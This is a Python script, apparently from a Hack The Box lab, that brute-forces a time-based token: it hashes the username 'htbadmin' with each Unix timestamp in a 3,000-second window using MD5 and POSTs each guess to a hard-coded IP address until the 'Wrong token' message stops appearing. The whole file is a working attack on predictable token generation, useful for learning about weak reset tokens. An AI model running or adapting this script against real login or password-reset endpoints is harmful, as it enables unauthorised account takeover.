from hashlib import md5
import requests
from sys import exit
from time import time
import datetime

url = "http://167.172.63.87:31857/question1/"

header= {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8" , "Content-Type": "application/x-www-form-urlencoded"}
now = 1664372522
start_time = now
fail_text = "Wrong token"
user= "htbadmin"
endtime=now+1500

for x in range(start_time-1500, endtime):

    raw_data = user+str(x)
    md5_token = md5(str(raw_data).encode()).hexdigest()
    data = "token={}&submit=check".format(md5_token)

    print("checking {} {}".format(str(x), md5_token))

    res = requests.post(url, data=data,headers=header)
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        print(md5_token)
        exit()
